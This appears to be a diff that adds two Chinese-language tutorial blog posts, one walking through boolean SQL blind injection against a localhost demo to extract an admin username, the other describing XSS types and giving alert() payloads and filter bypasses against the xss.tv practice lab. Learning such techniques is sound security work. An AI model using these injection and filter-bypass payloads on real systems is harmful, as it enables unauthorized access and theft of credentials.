@@ -274,6 +274,153 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-SQL注入——盲注" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/05/22/SQL注入——盲注/" class="article-date">
+      <time datetime="2019-05-22T11:41:29.223Z" itemprop="datePublished">2019-05-22</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/05/22/SQL注入——盲注/">SQL注入--盲注</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h1><h2 id="首先让我们一起来了解一下SQL注入的原理："><a href="#首先让我们一起来了解一下SQL注入的原理：" class="headerlink" title="首先让我们一起来了解一下SQL注入的原理："></a>首先让我们一起来了解一下SQL注入的原理：</h2><p> SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
+<h2 id="接下来就是如何防范："><a href="#接下来就是如何防范：" class="headerlink" title="接下来就是如何防范："></a>接下来就是如何防范：</h2><p>1.永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双”-“进行转换等。<br>2.永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。<br>3.永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。<br>4.不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。<br>5.应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装<br>6.sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFT SCAN等。采用MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。</p>
+<h3 id="SQL盲注的过程"><a href="#SQL盲注的过程" class="headerlink" title="SQL盲注的过程"></a>SQL盲注的过程</h3><p>1、<strong>测试有没有注入漏洞</strong><br>浏览器输入 <code>http://localhost:2003/newsInfo?id=1  and 1=1</code>    页面正常   后台执行的SQL语句为：select <em> from news where id=1 and 1=1<br>输入 <code>http://localhost:2003/newsInfo?id=1  and 1=2</code>  空白页面，数据无法显示(后台执行的SQL语句为：select </em> from news where id=1 and 1=2)，页面有注入漏洞。<br><img src="https://images2015.cnblogs.com/blog/181321/201612/181321-20161216163301558-866388304.gif" alt="在这里插入图片描述"><br>2、<strong>猜解数据库表名</strong><br>既然有漏洞，就准备做点事情咯，主要目的是拿到后台管理员密码，先看看数据库里有哪些表吧<br>  <code>http://localhost:2003/newsInfo?id=1 and (select count(*) from userInfo) &gt;=0</code>   没有数据，继续猜解…… N次，<br>终于 <code>http://localhost:2003/newsInfo?id=1 and (select count(*) from [user]) &gt;=0</code><br> 这里是利用 后面的条件查询数据库表，如果表不存在，后台就报错了，本测试示例后台对异常做了处理，但是数据肯定是出不来的。<br> <img src="https://images2015.cnblogs.com/blog/181321/201612/181321-20161216170931886-1916393652.gif" alt="在这里插入图片描述"><br> 数据显示正常，说明表 <strong>user</strong> 存在，判断 为 用户表<br> 3、<strong>表字段猜解</strong><br><code>http://localhost:2003/newsInfo?id=1 and (select count(pwd) from [user]) &gt;=0</code>  页面数据正常<br>说名表 <strong>user</strong> 存在 <strong>pwd</strong> 字段<br>同理  确认表 <strong>user</strong> 里存在  <strong>name</strong> 字段。<br>4、<strong>查询表里有多少条数据</strong><br><code>http://localhost:2003/newsInfo?id=1 and (select count(*) from [user]) &gt;=5</code> 返回空白页面</p>
+<p><code>http://localhost:2003/newsInfo?id=1 and (select count(*) from [user]) &gt;=2</code> 返回空白页面</p>
+<p><code>http://localhost:2003/newsInfo?id=1 and (select count(*) from [user]) =1</code>  页面正常  ，只有一个用户<br>5、<strong>用户名猜解</strong><br> ★<code>http://localhost:2003/newsInfo?id=1 and (select len(name) from [user]) =5</code> ，返回正常页面,确定用户名为5位字符<br> ★<b>  用户名猜解<br>         第一位    <code>http://localhost:2003/newsInfo?id=1 and (select ASCII(SUBSTRING(name,1,1)) from [user])&gt; 20</code>                                      返回正常页面 ……….. 下面猜解 N次<br> <code>http://localhost:2003/newsInfo?id=1 and (select ASCII(SUBSTRING(name,1,1)) from [user])&gt; 96</code>， 返回正常页面<br><code>http://localhost:2003/newsInfo?id=1 and (select ASCII(SUBSTRING(name,1,1)) from [user])&gt; 97</code>   返回空白页面了<br>这说明 第一位 ASCII值为 97，对应字母 a<br> 以此类推 ，第2位，第3位 …..第5位， 猜解出用户名 admin ，在这里主要用了 ASCII  和 SUBSTRING 函数，如果对这两个函数不熟悉请自行百度，下面是猜解过程截图。<br> <img src="https://images2015.cnblogs.com/blog/181321/201612/181321-20161219093210760-168383272.gif" alt="在这里插入图片描述"><br> 6、<strong>密码猜解</strong><br> 用户名搞定了，密码思路也是一样</b></p>
+<pre><code>&lt;A&gt; 先确定密码长度
+
+&lt;B&gt; 逐个密码猜解，这里就不写注入的sql语句了，同 用户名 猜解
+</code></pre><p>   至此，整改网站管理后台沦陷。</p>
+<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>SQL注入的手法相当灵活，在注入的时候会碰到很多意外的情况。能不能根据具体情况进行分析，构造巧妙的SQL语句，从而成功获取想要的数据，是高手与“菜鸟”的根本区别。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-XSS攻击" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/05/22/XSS攻击/" class="article-date">
+      <time datetime="2019-05-22T11:41:29.201Z" itemprop="datePublished">2019-05-22</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/05/22/XSS攻击/">XSS攻击</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="XSS攻击总结"><a href="#XSS攻击总结" class="headerlink" title="XSS攻击总结"></a>XSS攻击总结</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>   对于了解这个XSS是在网络安全攻防技术训练营每周四的例会上由社长讲解的 ，因此我来做一个总结基于我对XSS的认识。</p>
+<h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>   先来说一下XSS攻击以及他所带来的危害；</p>
+<p>  XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被骇客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，骇客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。</p>
+<p> XSS攻击的危害包括：<br>1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号<br>2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力<br>3、盗窃企业重要的具有商业价值的资料<br>4、非法转账<br>5、强制发送电子邮件<br>6、网站挂马<br>7、控制受害者机器向其它网站发起攻击</p>
+<p>XSS攻击的分类：<br>类型A，本地利用漏洞，这种漏洞存在于页面中客户端脚本自身。其攻击过程如下所示：<br>Alice给Bob发送一个恶意构造了Web的URL。<br>Bob点击并查看了这个URL。<br>恶意页面中的JavaScript打开一个具有漏洞的HTML页面并将其安装在Bob电脑上。<br>具有漏洞的HTML页面包含了在Bob电脑本地域执行的JavaScript。<br>Alice的恶意脚本可以在Bob的电脑上执行Bob所持有的权限下的命令。</p>
+<p>类型B，反射式漏洞，这种漏洞和类型A有些类似，不同的是Web客户端使用Server端脚本生成页面为用户提供数据时，如果未经验证的用户数据被包含在页面中而未经HTML实体编码，客户端代码便能够注入到动态页面中。其攻击过程如下：<br>Alice经常浏览某个网站，此网站为Bob所拥有。Bob的站点运行Alice使用用户名/密码进行登录，并存储敏感信息(比如银行帐户信息)。<br>Charly发现Bob的站点包含反射性的XSS漏洞。<br>Charly编写一个利用漏洞的URL，并将其冒充为来自Bob的邮件发送给Alice。<br>Alice在登录到Bob的站点后，浏览Charly提供的URL。<br>嵌入到URL中的恶意脚本在Alice的浏览器中执行，就像它直接来自Bob的服务器一样。此脚本盗窃敏感信息(授权、信用卡、帐号信息等)然后在Alice完全不知情的情况下将这些信息发送到Charly的Web站点。</p>
+<p>类型C，存储式漏洞，该类型是应用最为广泛而且有可能影响到Web服务器自身安全的漏洞，骇客将攻击脚本上传到Web服务器上，使得所有访问该页面的用户都面临信息泄漏的可能，其中也包括了Web服务器的管理员。其攻击过程如下：<br>Bob拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。<br>Charly注意到Bob的站点具有类型C的XSS漏洞。<br>Charly发布一个热点信息，吸引其它用户纷纷阅读。<br>Bob或者是任何的其他人如Alice浏览该信息，其会话cookies或者其它信息将被Charly盗走。</p>
+<p><strong>类型A直接威胁用户个体，而类型B和类型C所威胁的对象都是企业级Web应用。</strong></p>
+<h2 id="XSS攻击能做些什么"><a href="#XSS攻击能做些什么" class="headerlink" title="XSS攻击能做些什么"></a>XSS攻击能做些什么</h2><p>  1.窃取cookies，读取目标网站的cookie发送到黑客的服务器上；<br>2.读取用户未公开的资料，如：邮件列表或者内容、系统的客户资料，联系人列表等等，</p>
+<h2 id="XSS攻击常见利用方式："><a href="#XSS攻击常见利用方式：" class="headerlink" title="XSS攻击常见利用方式："></a>XSS攻击常见利用方式：</h2><p>1、最简单的就是普通的GET型XSS，这里描述参数不加密的URL：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.xss.tv/level1.php?name=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>直接URL参数提交注入，该注入能产生说明程序员没有过滤或用引号包裹任何参数内容，也就是说后台代码直接解析执行参数值。这就造成在弱类型的语言中，原本是正常的字符串被当作代码执行，形成该XSS漏洞。<br>2、第二种就是带&lt;input 标签的GET型XSS，直接在表单输入窗口直接输入XSS代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.xss.tv/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>这里选择在URL处直接注入代码，带&lt;input 标签的GET型XSS和普通的GET型XSS最大的区别就是普通的GET型XSS的参数可以直接被解析，而带&lt;input 标签的GET型XSS还需要闭合原本的input窗口，然后才能注入ShellCode。闭合点举例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line">	&lt;input name=keyword  value=&quot;test&quot;&gt;</span><br><span class="line">	&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>这里的keyword参数就是输入框的变量，我们输入的值会在替换value的值，也就是双引号里面的就是keyword变量代表的东西，所以我们闭合这个&lt;input 标签用的是<strong>“&gt;</strong>，后面就可以跟上ShellCode。<br>3、第三种就是过滤一些特殊字符：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line">	&lt;input name=keyword  value=&apos;&apos;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&apos;&gt;</span><br><span class="line">	&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以看出输入的”、&lt;和&gt;都被过滤了，所以带有尖括号的ShellCode就不能用了。所以在此换思路采用事件属性：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.xss.tv/level3.php?keyword=&apos;+onclick=&apos;javascript:alert(1)&apos;&amp;submit=submit</span><br></pre></td></tr></table></figure>
+<p>同样的道理，先闭合前一个变量值，在放ShellCode；<br>4、第四种就是过滤关键字：</p>
+<p>  一般测试的第一反应就是用最常见两中方式，发现特殊字符都被过滤了才会考虑用触发事件，但触发事件的关键字也被过滤了，这时候就要找有哪些还没有被过滤的。关键字测试：
+  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.xss.tv/level5.php?keyword=&quot; ONclick=&quot;javascript:alert(1)</span><br></pre></td></tr></table></figure>
+<p>源代码处可看到的结果是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=level5.php method=GET&gt;</span><br><span class="line">	&lt;input name=keyword  value=&quot;&quot; o_nclick=&quot;javascript:alert(/xss/)&quot;&gt;</span><br><span class="line">	&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>很明显，onclick关键字中间被加了下划线，这种是用双关键字和大小写绕过不了的，那就换一种触发事件，这里可以先考虑超链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.xss.tv/level5.php?keyword=&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;点这里&lt;/a&gt;//</span><br></pre></td></tr></table></figure>
+<p>后面加了个<strong>//</strong>的原因是为了注释掉后面多余的部分，以免影响代码的正确性。</p>
+<h3 id="因为时间有限我所搞明白的就也这些，不过社长水上云的博客有更多关于XSS攻击的知识；"><a href="#因为时间有限我所搞明白的就也这些，不过社长水上云的博客有更多关于XSS攻击的知识；" class="headerlink" title="因为时间有限我所搞明白的就也这些，不过社长水上云的博客有更多关于XSS攻击的知识；"></a>因为时间有限我所搞明白的就也这些，不过社长<a href="http://shuishangyun.github.io" target="_blank" rel="noopener">水上云的博客</a>有更多关于XSS攻击的知识；</h3>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-yelee主题更换" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
